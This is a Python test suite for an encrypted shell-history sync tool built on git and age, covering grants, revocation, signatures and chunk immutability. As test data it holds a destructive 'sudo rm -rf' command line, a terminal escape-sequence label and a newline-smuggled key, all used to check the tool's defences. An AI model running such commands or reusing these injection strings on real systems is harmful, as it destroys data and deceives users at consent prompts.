"""End-to-end sync: two machines exchanging history through a bare repo.

These drive the real ``age`` and the real ``git``. Mocking either would test the
mock -- the whole premise of sync is that ordinary git plus ordinary age
are enough, and that is only meaningful if it is actually demonstrated.
"""

from __future__ import annotations

import io
import os
import secrets
import subprocess
import tempfile
import time
import tracemalloc
import unittest
import zlib
from collections.abc import Callable, Iterator
from contextlib import contextmanager, redirect_stderr, redirect_stdout
from pathlib import Path
from typing import ClassVar
from unittest import mock

from woswoar import cache, crypto, search, store, sync
from woswoar.__main__ import _GRANT_REMEDY, main
from woswoar.entry import Entry, format_line
from woswoar.sync import COMMIT_MESSAGE as COMMIT

from . import support
from .support import requires_age, requires_git, requires_ssh_keygen

#: One authoritative list, plus HOME which only these tests need to redirect.
_ENV = (*support.ENV_KEYS, "HOME")


class Fake:
    """One simulated machine with its own config, logs, and clone."""

    def __init__(self, root: Path, name: str) -> None:
        self.root = root / name
        self.name = name
        self._id: str | None = None
        for sub in ("data", "conf", "cache"):
            (self.root / sub).mkdir(parents=True, exist_ok=True)

    @property
    def env(self) -> dict[str, str]:
        return {
            "HOME": str(self.root),
            "WOSWOAR_DIR": str(self.root / "data"),
            "XDG_CONFIG_HOME": str(self.root / "conf"),
            "XDG_CACHE_HOME": str(self.root / "cache"),
        }

    @contextmanager
    def active(self) -> Iterator[Fake]:
        """Run a block as if we were sitting at this machine."""
        saved = {k: os.environ.get(k) for k in _ENV}
        os.environ.pop("WOSWOAR_SESSION", None)
        os.environ.update(self.env)
        try:
            yield self
        finally:
            for key, value in saved.items():
                if value is None:
                    os.environ.pop(key, None)
                else:
                    os.environ[key] = value

    # -- convenience, all assuming `active()` is held ----------------------

    @property
    def id(self) -> str:
        """This machine's id, resolved once and remembered.

        Deliberately cached: store.machine() reads the *ambient* environment, so
        a live lookup would quietly return the wrong machine's id whenever one
        Fake is inspected while another is active -- which is most assertions in
        a two-machine test.
        """
        if self._id is None:
            self._id = store.machine().id
        return self._id

    def record(self, day: str, ts: int, cmd: str, session: str = "s1") -> None:
        """Append a line the way the shell hook would.

        Through `store.private_append`, because the hook creates its day file
        owner-only; a raw ``open("a")`` here would leave 0644 files that no
        real recording path produces.
        """
        entry = Entry(ts, self.id, session, "~/src", 0, 5, cmd)
        with store.private_append(store.log_file(self.id, day)) as handle:
            handle.write(format_line(entry) + "\n")

    def commands(self) -> set[str]:
        return {e.cmd for e in cache.load_entries()}

    def entries(self) -> list[Entry]:
        """Everything merged here, *not* deduplicated.

        `commands()` is a set, and a set is exactly what hides a day written
        twice over -- which is what a rewrite that should have happened and did
        not leaves behind.
        """
        return cache.load_entries()

    def append_recipient(self, name: str = "") -> str:
        """Enrol a machine behind woswoar's back, and return its recipient.

        Written straight into the repo rather than through `sync.add_recipient`,
        because that is what the other end of a shared repo looks like: files
        that arrived by `git pull`, whose contents nothing here sanitised.

        ``name`` fabricates the host directory that gives the key a name --
        `signer.pub` to claim it and a `.name` mirror to hold it -- because that
        is where a name lives now. It is not a trusted path: sealing a file to
        the published recipients needs no secret, so a name is still attacker
        text and is still shown quoted beside a fingerprint.
        """
        key = crypto.generate_identity().public
        with store.recipients_file().open("a", encoding="utf-8") as handle:
            handle.write(f"{key}\n")
        if name:
            host = secrets.token_hex(8)
            verify_key = crypto.generate_signing_key(self.root / f"signer-{host}")
            store.write_atomic(store.signer_public(host), f"{verify_key}\n{key}\n".encode())
            store.write_atomic(store.name_file(host), f"{name}\n".encode())
        return key


@requires_age
@requires_git
class SyncTestCase(unittest.TestCase):
    def setUp(self) -> None:
        # `ignore_cleanup_errors` because git may still be finishing
        # background maintenance in the repo when the directory goes: it
        # creates a file under `.git` between the walk and the rmdir, and
        # `rmtree` fails with "Directory not empty". Measured at about one
        # run in forty, on this change and on main alike, so it is a
        # teardown race rather than anything under test -- and a suite that
        # reddens at random teaches people to re-run it rather than read it.
        # `ignore_cleanup_errors` because git may still be finishing background
        # maintenance in the repo when the directory goes: it creates a file
        # under `.git` between the walk and the rmdir, and `rmtree` fails with
        # "Directory not empty". Measured at about one run in forty, on this
        # branch and on main alike, so it is a teardown race rather than
        # anything under test -- and a suite that reddens at random teaches
        # people to re-run it rather than read it.
        self._tmp = tempfile.TemporaryDirectory(prefix="woswoar-sync-", ignore_cleanup_errors=True)
        self.addCleanup(self._tmp.cleanup)
        self.root = Path(self._tmp.name)

        self.origin = self.root / "origin.git"
        subprocess.run(
            ["git", "init", "--quiet", "--bare", str(self.origin)], check=True, timeout=60
        )

    def machine(self, name: str, enrol: bool = True, display: str | None = None) -> Fake:
        fake = Fake(self.root, name)
        if enrol:
            with fake.active():
                if display:
                    # Set before init: name.age is sealed during enrolment.
                    store.save_machine(store.machine()._replace(name=display))
                # A dedicated identity, not the developer's real SSH key.
                sync.initialise(remote=str(self.origin), new_identity=True)
                _ = fake.id  # resolve while this machine's env is in effect
        return fake

    def git_in_repo(self, fake: Fake, *args: str) -> str:
        with fake.active():
            return sync.git(*args)

    def history_across_days(self, days: int, per_day: int) -> tuple[Fake, Fake]:
        """alpha with `days` days of `per_day` commands, each its own chunk,
        and a beta that has been granted but has merged nothing yet."""
        alpha = self.machine("alpha")
        with alpha.active():
            for day in range(days):
                base = 1_700_000_000 + day * 100_000
                for i in range(per_day):
                    alpha.record(f"2023-11-{14 + day:02d}", base + i, f"day {day} command {i}")
                    sync.run(now=base + 500 + i)
        beta = self.machine("beta")
        with alpha.active():
            sync.grant()
        return alpha, beta

    def accept_everyone(self, fake: Fake) -> None:
        """Accept every machine publishing here, as a human at ``fake`` would.

        The ceremony this design costs, and only in one direction: a machine
        that cloned *after* another enrolled pinned it on the spot, but one that
        cloned before has never been told the newcomer exists. What the repo
        says can never add trust on its own -- anyone who can push can write to
        it -- so a person at this machine has to say so.
        """
        with fake.active():
            sync.trust(sync.trust_candidates())

    def run_cli(self, fake: Fake, *argv: str) -> tuple[int, str]:
        """Drive the real CLI as ``fake``, returning ``(exit code, stdout)``.

        Only stdout: several commands put their warnings on stderr, and a test
        that means "it warned" has to say which stream it is asserting on. The
        two that need stderr capture it themselves.
        """
        buffer = io.StringIO()
        with fake.active(), redirect_stdout(buffer):
            code = main(list(argv))
        return code, buffer.getvalue()


class TestSingleMachine(SyncTestCase):
    def test_export_seals_and_pushes(self) -> None:
        alpha = self.machine("alpha")
        with alpha.active():
            alpha.record("2023-11-14", 1_700_000_001, "git status")
            report = sync.run()
            self.assertEqual(report.chunks_written, 1)
            self.assertEqual(report.lines_exported, 1)
            self.assertTrue(report.pushed)

    def test_nothing_new_writes_no_chunk(self) -> None:
        alpha = self.machine("alpha")
        with alpha.active():
            alpha.record("2023-11-14", 1_700_000_001, "git status")
            sync.run()
            again = sync.run()
            self.assertEqual(again.chunks_written, 0)
            self.assertEqual(again.lines_exported, 0)

    def test_nothing_readable_leaks_into_the_repo(self) -> None:
        alpha = self.machine("alpha")
        with alpha.active():
            alpha.record("2023-11-14", 1_700_000_001, "sudo rm -rf /very-secret-path")
            sync.run()
            blob = b"".join(p.read_bytes() for p in store.history_dir().rglob("*") if p.is_file())
        self.assertNotIn(b"very-secret-path", blob)
        self.assertNotIn(b"sudo", blob)

    def test_partial_final_line_is_not_sealed_until_complete(self) -> None:
        alpha = self.machine("alpha")
        with alpha.active():
            path = store.log_file(alpha.id, "2023-11-14")
            path.parent.mkdir(parents=True, exist_ok=True)
            path.write_text("1700000001\ts1\t~/src\t0\t5\tcomplete\n1700000002\ts1", "utf-8")

            sync.run()
            state = sync.State.load()
            relpath = f"hosts/{alpha.id}/2023-11-14.tsv"
            # The watermark stops at the last newline, so the half-written record
            # is left for next time rather than sealed into an immutable chunk.
            self.assertEqual(state.exported[relpath], path.stat().st_size - len("1700000002\ts1"))


class TestTwoMachines(SyncTestCase):
    def test_history_reaches_the_other_machine(self) -> None:
        alpha = self.machine("alpha")
        with alpha.active():
            alpha.record("2023-11-14", 1_700_000_001, "git status")
            alpha.record("2023-11-14", 1_700_000_002, "make -j8")
            sync.run()

        beta = self.machine("beta")
        with beta.active():
            sync.run()
        # beta joined after alpha sealed those lines, so it cannot read them yet.
        # One command on an already-enrolled machine is the whole fix, exactly
        # as documented -- no surrounding sync to fetch beta's key or publish.
        with alpha.active():
            sync.grant()
        with beta.active():
            report = sync.run()
            self.assertEqual(report.chunks_merged, 1)
            self.assertEqual(beta.commands(), {"git status", "make -j8"})

    def test_reencrypt_alone_grants_access_without_a_surrounding_sync(self) -> None:
        """The recipient list is a file in the working tree.

        Re-sealing against a checkout taken before the new machine enrolled
        rewrites every key to the *old* recipients and reports full success,
        while granting nothing. So `reencrypt` has to fetch first, and this
        pins that it does -- alpha never syncs after beta joins.
        """
        alpha = self.machine("alpha")
        with alpha.active():
            alpha.record("2023-11-14", 1_700_000_001, "git status")
            sync.run()

        beta = self.machine("beta")  # init publishes beta's public key
        with alpha.active():
            report = sync.grant()
            self.assertTrue(report.pushed)
            self.assertEqual(report.skipped, 0)
            self.assertGreater(report.resealed, 0)

        with beta.active():
            sync.run()
            self.assertEqual(beta.commands(), {"git status"})

    def test_a_new_machine_cannot_reencrypt_for_itself(self) -> None:
        """Re-sealing means opening the key first, which beta cannot do.

        This is the property the encryption rests on, not a missing feature:
        a machine nobody granted access to must not be able to grant itself
        access. It must say so rather than report a successful no-op.
        """
        alpha = self.machine("alpha")
        with alpha.active():
            alpha.record("2023-11-14", 1_700_000_001, "git status")
            sync.run()

        beta = self.machine("beta")
        with beta.active():
            sync.run()
            report = sync.grant()
            # It re-seals what it owns -- its own name seal -- and skips both
            # alpha's day key and the repo key, so it still cannot read
            # anything, and above all cannot authorise itself to.
            self.assertGreater(report.skipped, 0)
            self.assertTrue(sync.run().unreadable)
            self.assertEqual(beta.commands(), set())

    def test_a_machine_waiting_for_grant_publishes_at_once_and_only_reads_later(self) -> None:
        """The state between `init` and `grant`, which is normal, not an error.

        Publishing needs nothing from anybody: this machine signs with a key of
        its own and seals to a day key it mints itself. Only *reading* waits.
        That is a change -- under the shared key it could not tag a chunk
        either, so its own history piled up locally until someone else acted.
        """
        alpha = self.machine("alpha")
        with alpha.active():
            alpha.record("2023-11-14", 1_700_000_001, "git status")
            sync.run()

        beta = self.machine("beta")
        with beta.active():
            beta.record("2023-11-15", 1_700_100_000, "beta's own command")
            report = sync.run()
            self.assertEqual(report.lines_exported, 1, "beta should publish without waiting")
            self.assertTrue(report.unreadable, "but it cannot read alpha's history yet")
            self.assertEqual(beta.commands(), {"beta's own command"})

        # And alpha, which cloned first, sees it once a human there accepts it.
        self.accept_everyone(alpha)
        with alpha.active():
            self.assertEqual(sync.run().lines_imported, 1)
            self.assertIn("beta's own command", alpha.commands())

        with alpha.active():
            sync.grant()
        with beta.active():
            sync.run()
            self.assertEqual(beta.commands(), {"beta's own command", "git status"})

    def test_merging_is_idempotent(self) -> None:
        alpha = self.machine("alpha")
        beta = self.machine("beta")
        with alpha.active():
            alpha.record("2023-11-14", 1_700_000_001, "git status")
            sync.run()
            sync.grant()
        with beta.active():
            sync.run()
            first = len(cache.load_entries())
            for _ in range(3):
                sync.run()
            self.assertEqual(len(cache.load_entries()), first, "re-sync duplicated entries")

    def test_offline_backlog_spanning_days(self) -> None:
        alpha = self.machine("alpha")
        beta = self.machine("beta")
        with alpha.active():
            sync.run()
            sync.grant()
        with beta.active():
            sync.run()

        with alpha.active():
            for day, ts in (("2023-11-14", 1_700_000_001), ("2023-11-15", 1_700_100_000)):
                alpha.record(day, ts, f"command on {day}")
            # One sync after several days offline: a chunk per day, because a
            # chunk always belongs to exactly one day file.
            report = sync.run()
            self.assertEqual(report.chunks_written, 2)

        with beta.active():
            sync.run()
            self.assertEqual(beta.commands(), {"command on 2023-11-14", "command on 2023-11-15"})

    def test_other_machines_name_is_learned(self) -> None:
        alpha = self.machine("alpha", display="alpha@laptop")
        beta = self.machine("beta")
        with alpha.active():
            alpha.record("2023-11-14", 1_700_000_001, "git status")
            sync.run()
            sync.grant()
        with beta.active():
            sync.run()
            # Without this, search would label alpha's entries with its opaque id.
            self.assertEqual(store.host_names().get(alpha.id), "alpha@laptop")

    def test_search_spans_hosts_but_host_scope_does_not(self) -> None:
        alpha = self.machine("alpha")
        beta = self.machine("beta")
        with alpha.active():
            alpha.record("2023-11-14", 1_700_000_001, "from alpha")
            sync.run()
            sync.grant()
        with beta.active():
            beta.record("2023-11-14", 1_700_000_050, "from beta")
            sync.run()
            entries = cache.load_entries()
            self.assertEqual(len(search.filter_scope(entries, "global")), 2)
            self.assertEqual([e.cmd for e in search.filter_scope(entries, "host")], ["from beta"])


class TestImmutability(SyncTestCase):
    """The invariant the whole storage design rests on."""

    def test_no_chunk_is_ever_modified_or_deleted(self) -> None:
        alpha = self.machine("alpha")
        beta = self.machine("beta")

        with alpha.active():
            for i in range(4):
                alpha.record("2023-11-14", 1_700_000_000 + i, f"alpha {i}")
                sync.run()
            sync.grant()
        with beta.active():
            for i in range(3):
                beta.record("2023-11-15", 1_700_100_000 + i, f"beta {i}")
                sync.run()
        with alpha.active():
            sync.run()

        # Exact, not a heuristic: if any commit ever modified or deleted a
        # chunk, this lists it. An empty result is the guarantee that repo
        # growth equals the bytes written.
        touched = self.git_in_repo(
            alpha,
            "log",
            "--all",
            "--diff-filter=MD",
            "--name-only",
            "--pretty=format:",
            "--",
            "hosts",
        )
        # Every rewritten path, not just the `*.age` ones. Filtering by suffix
        # first made the allowlist below vacuous for anything not named `.age`,
        # so a rewritten manifest -- or any future file -- would have sailed
        # through an assertion that reads like it covers the tree.
        rewritten = {line for line in touched.splitlines() if line.strip()}

        # Chunks live under hosts/<id>/YYYY-MM-DD/. Key files, name seals,
        # signer keys and manifests sit elsewhere in the tree and *are*
        # rewritten, by design: that is what makes onboarding cheap and what
        # lets a day's signed list grow as the day goes on. Separating the two
        # here keeps the exception explicit rather than quietly widening the
        # invariant. Classified by store, not by a regex copied here: a
        # hand-maintained pattern would silently stop matching if the layout
        # changed, leaving this vacuously true while real chunks were rewritten.
        chunks = {p for p in rewritten if store.is_chunk_path(p)}
        self.assertEqual(sorted(chunks), [], f"chunks were rewritten: {sorted(chunks)}")

        # And the only things that were rewritten are the ones allowed to be.
        allowed = ("/keys/", "/manifests/")
        self.assertTrue(
            all(
                any(part in p for part in allowed)
                or p.endswith("/name.age")
                or p.endswith("/signer.pub")
                for p in rewritten
            ),
            f"unexpected rewrites: {sorted(rewritten - chunks)}",
        )

    def test_repo_growth_tracks_bytes_written_not_sync_count(self) -> None:
        syncs = 20
        alpha = self.machine("alpha")
        with alpha.active():
            for i in range(syncs):
                alpha.record("2023-11-14", 1_700_000_000 + i, f"command number {i}")
                sync.run()

            self.git_in_repo(alpha, "gc", "--quiet")
            # git's own reported object size. Summing files under .git would
            # instead measure the sample hooks, which dwarf a repo this small.
            counts = dict(
                line.split(": ", 1)
                for line in self.git_in_repo(alpha, "count-objects", "-v").splitlines()
                if ": " in line
            )
            stored = int(counts["size-pack"]) * 1024 + int(counts["size"]) * 1024
            chunk_bytes = sum(c.path.stat().st_size for c in store.iter_chunks(alpha.id))
            chunks = len(list(store.iter_chunks(alpha.id)))

        self.assertEqual(chunks, syncs, "each sync must produce exactly one chunk")
        # Chunks are written once and never rewritten, so git stores each
        # exactly once: total objects stay close to the bytes actually written.
        # Re-encrypting the whole day file each sync would instead store
        # 1+2+...+N copies and blow straight past this.
        self.assertLess(
            stored,
            chunk_bytes * 4 + 64 * 1024,
            f"stored={stored} chunk_bytes={chunk_bytes} over {syncs} syncs",
        )


class TestChunkPayload(unittest.TestCase):
    """The chunk encoding, without needing age or git."""

    def test_round_trip(self) -> None:
        for data in (b"", b"x", b"a line\n", b"repeated line\n" * 500, bytes(range(256))):
            self.assertEqual(sync.unpack(sync.pack(data)), data)

    def test_repetitive_input_shrinks(self) -> None:
        # Shell history is repetitive by nature, and this is the one moment it
        # can be compressed: once sealed, ciphertext is incompressible forever.
        data = b"1700000000\ts1\t~/src\t0\t5\tgit status\n" * 200
        self.assertLess(len(sync.pack(data)), len(data) // 10)

    def test_a_tiny_chunk_costs_only_a_few_bytes(self) -> None:
        """Deflate has a floor, and one very short line can land above it.

        This is what `pack` used to avoid by tagging each payload raw-or-
        deflated and keeping the smaller. It was not worth it: the tag cost a
        byte on every chunk that *did* compress, which is all but the shortest,
        and the worst case it bought back is the handful of bytes below --
        against a sealed chunk that already carries a 200-byte age header.
        """
        data = b"1700000000\ts1\t~\t0\t5\tls\n"
        self.assertLess(len(sync.pack(data)) - len(data), 8)

    def test_a_payload_we_cannot_read_is_refused(self) -> None:
        # Loudly, rather than decoding into garbage that then gets appended to
        # a log file and cached. `_merge_host` turns this into an unreadable
        # chunk rather than letting it abort the sync.
        truncated = zlib.compress(b"x" * 5000)[:20]
        for blob in (b"\x7fanything", b"", b"1700000000\ts1\t~\t0\t5\tls\n", truncated):
            with self.assertRaises(zlib.error):
                sync.unpack(blob)


class TestGrantConfirmation(SyncTestCase):
    """`grant` widens who can read everything, so it says so and asks first."""

    def test_readers_are_labelled_for_a_human(self) -> None:
        # `age1ejf3l4f0nhnp9...` is not something anyone can consent to.
        alpha = self.machine("alpha", display="martinus@box")
        with alpha.active():
            labels = {reader.label for reader in sync.readers()}
        self.assertIn("martinus@box", labels)

    def test_a_key_with_no_name_yet_is_not_named_after_itself(self) -> None:
        """The fallback label used to be an abbreviation of the key.

        That let a *chosen* label impersonate one, which was the whole weakness.
        A name can no longer be derived from a key at all -- it comes from the
        sealed `name.age` or it is the placeholder -- so this pins the placeholder
        rather than the abbreviation it replaced.
        """
        alpha = self.machine("alpha")
        with alpha.active():
            key = alpha.append_recipient()
            (reader,) = [r for r in sync.readers() if r.key == key]

        self.assertEqual(reader.label, sync.UNNAMED)
        self.assertFalse(any(part and part in key for part in reader.label.split("...")))

    def test_a_key_listed_twice_is_offered_to_age_once(self) -> None:
        """`recipients.txt` is `merge=union`.

        Two machines appending the same key, one labelled and one not, leaves
        both lines -- and age rejects a repeated recipient.
        """
        alpha = self.machine("alpha", display="box")
        with alpha.active():
            key = sync.recipients()[0]
            path = store.recipients_file()
            path.write_text(f"{key}\n{key}{sync._LABEL_SEP}box\n", encoding="utf-8")
            self.assertEqual(sync.recipients(), [key])
            # And it is still usable, which is the point of deduplicating.
            crypto.encrypt_to_recipients(b"x", sync.recipients())

    def test_granting_refuses_if_the_machines_changed_while_deciding(self) -> None:
        """A confirmation that can under-report what it authorises is worse
        than none, so the approved list is checked against the fetched one."""
        alpha = self.machine("alpha")
        with alpha.active():
            approved = [reader.key for reader in sync.readers()]
        self.machine("beta")  # enrols behind alpha's back

        with alpha.active(), self.assertRaises(sync.SyncError) as caught:
            sync.grant(approved=approved)
        self.assertIn("changed while you were deciding", str(caught.exception))

    def test_granting_with_the_approved_list_goes_ahead(self) -> None:
        alpha = self.machine("alpha")
        with alpha.active():
            report = sync.grant(approved=[reader.key for reader in sync.readers()])
            self.assertGreater(report.resealed, 0)

    def test_a_label_cannot_drive_the_terminal(self) -> None:
        """`\\x1b[1A\\x1b[2K` moves the cursor up a line and erases it.

        A label is free text appended by whoever added the key, so on a shared
        repo it is attacker input, and the one place it is printed is the prompt
        where a human decides who may read everything.
        """
        alpha = self.machine("alpha")
        with alpha.active():
            alpha.append_recipient(name="martin@laptop\x1b[2K\x1b[1A")
            for reader in sync.readers():
                self.assertNotIn("\x1b", reader.label)
                self.assertNotIn("\n", reader.label)

    def test_a_key_that_is_not_one_line_is_refused_rather_than_written(self) -> None:
        alpha = self.machine("alpha")
        with alpha.active(), self.assertRaises(sync.SyncError) as caught:
            sync.add_recipient(f"{crypto.generate_identity().public}\nage1intruder")
        self.assertIn("not one line", str(caught.exception))

    def test_two_keys_with_one_name_are_told_apart(self) -> None:
        """The defence is not that duplicate names are impossible -- two
        machines really can share one -- it is that the identity shown is
        derived from the key, and that the collision is said out loud.
        """
        alpha = self.machine("alpha", display="martin@laptop")
        with alpha.active():
            alpha.append_recipient(name="martin@laptop")
            readers = sync.readers()

        self.assertEqual({reader.label for reader in readers}, {"martin@laptop"})
        self.assertEqual(len({reader.fingerprint for reader in readers}), 2)
        self.assertTrue(all(reader.shares_name for reader in readers))

    def test_a_name_nobody_else_uses_is_not_flagged(self) -> None:
        alpha = self.machine("alpha", display="martin@laptop")
        with alpha.active():
            alpha.append_recipient(name="martin@desktop")
            self.assertFalse(any(reader.shares_name for reader in sync.readers()))

    def test_machines_whose_name_is_not_known_yet_do_not_count_as_duplicates(self) -> None:
        """Names arrive with a sync, so several can be pending at once.

        `(unnamed)` is a placeholder, not a name. Counting it as one turns the
        signal that means "look closely at these two" into something an ordinary
        first sync prints about every machine that has not been merged yet.
        """
        alpha = self.machine("alpha", display="martin@laptop")
        with alpha.active():
            for _ in range(3):
                alpha.append_recipient()
            unnamed = [r for r in sync.readers() if r.label == sync.UNNAMED]
            self.assertEqual(len(unnamed), 3)
            self.assertFalse(any(r.shares_name for r in unnamed))

            # And the placeholder is not a name a peer can claim its way into.
            # Sealing a `name.age` needs no secret, so anything spelled here can
            # be spelled there; two peers claiming it are told apart from a
            # machine whose name simply has not arrived.
            alpha.append_recipient(name=sync.UNNAMED)
            alpha.append_recipient(name=sync.UNNAMED)
            flagged = [r for r in sync.readers() if r.shares_name]
            self.assertEqual(len(flagged), 2)
            still_unknown = [r for r in sync.readers() if not r.shares_name]
            self.assertEqual(len([r for r in still_unknown if r.label == sync.UNNAMED]), 3)

            # A real repeat is still called out.
            alpha.append_recipient(name="martin@laptop")
            named = [r for r in sync.readers() if r.label == "martin@laptop"]
        self.assertEqual(len(named), 2)
        self.assertTrue(all(r.shares_name for r in named))

    def test_the_machine_the_human_is_sitting_at_is_marked(self) -> None:
        alpha = self.machine("alpha", display="martin@laptop")
        with alpha.active():
            mine = crypto.recipient_for(sync.identity_path(store.machine())).strip()
            alpha.append_recipient(name="martin@desktop")
            marked = [reader.key for reader in sync.readers() if reader.is_mine]
        self.assertEqual(marked, [mine])


class TestRevokeSubtraction(SyncTestCase):
    """A withdrawal has to survive `merge=union`, which never deletes a line."""

    def test_a_revoked_key_stops_being_a_recipient(self) -> None:
        alpha = self.machine("alpha")
        with alpha.active():
            gone = alpha.append_recipient(name="old-laptop")
            self.assertIn(gone, sync.recipients())

            sync.revoke(sync.find_reader(crypto.fingerprint(gone)))
            self.assertNotIn(gone, sync.recipients())

    def test_a_tombstone_above_its_key_still_subtracts(self) -> None:
        """Union merges interleave two machines' appends in whatever order the
        rebase produces, so the withdrawal can land above the enrolment.

        Skipping tombstones as they are met, rather than collecting them in a
        pass of their own, would make this depend on line order.
        """
        alpha = self.machine("alpha")
        with alpha.active():
            mine = sync.recipients()
            gone = crypto.generate_identity().public
            store.recipients_file().write_text(
                f"-{gone}{sync._LABEL_SEP}revoked\n{gone}{sync._LABEL_SEP}old-laptop\n"
                + "".join(f"{key}\n" for key in mine),
                encoding="utf-8",
            )
            self.assertNotIn(gone, sync.recipients())

    def test_a_revoked_key_cannot_be_re_added(self) -> None:
        """Otherwise whoever the revocation was aimed at un-revokes themselves
        by appending the line again -- they have push access, that is the whole
        premise. Re-enrolling a real machine means a new identity."""
        alpha = self.machine("alpha")
        with alpha.active():
            gone = alpha.append_recipient(name="old-laptop")
            sync.revoke(sync.find_reader(crypto.fingerprint(gone)))

            with self.assertRaises(sync.SyncError) as caught:
                sync.add_recipient(gone)
            self.assertIn("revocation is permanent", str(caught.exception))

            # And appending the line by hand, which is all push access buys,
            # does not bring it back either.
            with store.recipients_file().open("a", encoding="utf-8") as handle:
                handle.write(f"{gone}{sync._LABEL_SEP}back-again\n")
            self.assertNotIn(gone, sync.recipients())

    def test_revoking_re_seals_so_the_key_can_no_longer_open_the_repo(self) -> None:
        """The list is what future keys are minted from; this is what makes a
        copy of the repo taken *after* the revocation useless to that key."""
        alpha = self.machine("alpha")
        beta = self.machine("beta")
        with alpha.active():
            sync.run()
        with beta.active():
            sync.run()
            beta_identity = sync.identity_path(store.machine())
            beta_key = crypto.recipient_for(beta_identity).strip()

        with alpha.active():
            sync.grant(approved=[reader.key for reader in sync.readers()])
            sealed = store.name_seal(store.machine().id)
            # Opens for beta here, which is what makes the failure below a
            # consequence of the revocation rather than of never having access.
            crypto.decrypt_with_file(sealed.read_bytes(), beta_identity)

            report = sync.revoke(sync.find_reader(crypto.fingerprint(beta_key)))
            self.assertGreater(report.resealed, 0)
            resealed = sealed.read_bytes()

        with self.assertRaises(crypto.AgeError):
            crypto.decrypt_with_file(resealed, beta_identity)

    def test_a_revoked_machine_cannot_read_history_recorded_afterwards(self) -> None:
        """The end-to-end claim, driven through real age and real git."""
        alpha = self.machine("alpha")
        beta = self.machine("beta")
        with alpha.active():
            sync.run()
        with beta.active():
            sync.run()
        with alpha.active():
            sync.grant(approved=[reader.key for reader in sync.readers()])
            alpha.record("2023-11-14", 1_700_000_001, "before-revocation")
            sync.run()
        with beta.active():
            sync.run()
            self.assertIn("before-revocation", beta.commands())
            beta_key = crypto.recipient_for(sync.identity_path(store.machine())).strip()

        with alpha.active():
            sync.revoke(sync.find_reader(crypto.fingerprint(beta_key)))
            # A fresh day, so the key is minted from the reduced list. Same-day
            # keys already exist and are reported as still readable instead.
            alpha.record("2023-11-15", 1_700_100_002, "after-revocation")
            sync.run()

        with beta.active():
            sync.run()
            self.assertNotIn("after-revocation", beta.commands())
        with alpha.active():
            self.assertIn("after-revocation", alpha.commands())

    def test_days_already_keyed_are_reported_rather_than_left_to_be_guessed(self) -> None:
        alpha = self.machine("alpha")
        with alpha.active():
            alpha.record("2023-11-14", 1_700_000_001, "recorded today")
            sync.run()
            gone = alpha.append_recipient(name="old-laptop")
            report = sync.revoke(sync.find_reader(crypto.fingerprint(gone)))
        self.assertEqual(report.still_readable, ["2023-11-14"])

    def test_revoking_this_machine_is_refused(self) -> None:
        # It would seal the history away from the machine doing the sealing.
        alpha = self.machine("alpha")
        with alpha.active():
            (mine,) = [reader for reader in sync.readers() if reader.is_mine]
            with self.assertRaises(sync.SyncError) as caught:
                sync.revoke(mine)
        self.assertIn("lock this machine out", str(caught.exception))

    def test_revoking_the_only_other_machine_leaves_the_history_readable(self) -> None:
        """Sealing to an empty recipient list is how you lose an archive."""
        alpha = self.machine("alpha")
        with alpha.active():
            # Only one recipient, and it is not this machine -- so `is_mine`
            # does not catch it and the emptiness guard is what has to.
            store.recipients_file().write_text("", encoding="utf-8")
            only = alpha.append_recipient(name="only-one")
            (other,) = sync.readers()
            with self.assertRaises(sync.SyncError) as caught:
                sync.revoke(other)
            self.assertIn(only, sync.recipients())
        self.assertIn("only machine left", str(caught.exception))

    def test_the_revoked_machine_is_told_that_rather_than_to_ask_for_a_grant(self) -> None:
        """It is the machine that can no longer decrypt anything, so it is also
        the one that would otherwise see "ask someone to run grant" forever."""
        alpha = self.machine("alpha")
        beta = self.machine("beta")
        with alpha.active():
            sync.run()
        with beta.active():
            sync.run()
            beta_key = crypto.recipient_for(sync.identity_path(store.machine())).strip()
        with alpha.active():
            sync.grant(approved=[reader.key for reader in sync.readers()])
            sync.revoke(sync.find_reader(crypto.fingerprint(beta_key)))

        with beta.active():
            report = sync.run()
        self.assertTrue(report.revoked)

        buffer = io.StringIO()
        with beta.active(), redirect_stderr(buffer):
            self.assertEqual(main(["sync"]), 0)
        message = buffer.getvalue()
        self.assertIn("was revoked", message)
        self.assertNotIn(_GRANT_REMEDY, message)

    def test_a_machine_merely_waiting_for_a_grant_is_not_told_it_was_revoked(self) -> None:
        alpha = self.machine("alpha")
        with alpha.active():
            # Published *before* beta exists, so its day key is sealed to a list
            # beta is not on. That is the only thing `grant` is still needed for.
            alpha.record("2023-11-14", 1_700_000_001, "sealed before beta joined")
            sync.run()
        beta = self.machine("beta")
        with beta.active():
            report = sync.run()
        self.assertTrue(report.unreadable, "beta is waiting for a grant, not revoked")
        self.assertFalse(report.revoked)

    def test_a_key_shaped_like_a_tombstone_is_refused(self) -> None:
        alpha = self.machine("alpha")
        with alpha.active(), self.assertRaises(sync.SyncError) as caught:
            sync.add_recipient(f"-{crypto.generate_identity().public}")
        self.assertIn("may not start with", str(caught.exception))


class TestARevokedMachineCannotPublish(SyncTestCase):
    """Issue #38, which is the whole point of per-machine signatures.

    A revoked machine keeps its own signing key -- nobody can take it back --
    and keeps every manifest it ever signed. What it loses is any peer willing
    to accept them. That is only expressible because signing is asymmetric: with
    the shared MAC these tests replaced, holding the key to *check* a chunk was
    holding the key to *forge* one, so a revoked machine could publish forever.
    """

    def fleet(self) -> tuple[Fake, Fake, Fake]:
        """alpha and beta enrolled and readable, gamma accepting both."""
        alpha = self.machine("alpha")
        beta = self.machine("beta")
        gamma = self.machine("gamma")
        with alpha.active():
            # alpha publishes, so its day key exists for the cross-host test to
            # seal against -- which is exactly what an attacker would find.
            alpha.record("2023-11-14", 1_700_000_000, "alpha-history")
            sync.run()
            sync.grant(approved=[reader.key for reader in sync.readers()])
        for machine in (beta, gamma):
            with machine.active():
                sync.run()
        for machine in (alpha, beta, gamma):
            self.accept_everyone(machine)
        return alpha, beta, gamma

    def publish_as_revoked(self, beta: Fake, day: str, ts: int, cmd: str) -> None:
        """Everything beta can still do: seal, sign with its own key, push.

        Deliberately not `sync.run`, which would notice beta is revoked and stop.
        The question is not whether beta cooperates -- it is whether refusing
        beta is a *decision the peers make*.
        """
        with beta.active():
            beta.record(day, ts, cmd)
            known = store.machine()
            with sync.lock():
                sync._fetch_and_rebase(sync.read_repo())
                sync.export(known, sync.State.load(), sync.Report(), ts)
                sync._commit()
                sync._push(sync.read_repo())

    def revoke_beta(self, alpha: Fake, beta: Fake) -> None:
        with beta.active():
            beta_key = crypto.recipient_for(sync.identity_path(store.machine())).strip()
        with alpha.active():
            sync.revoke(sync.find_reader(crypto.fingerprint(beta_key)))

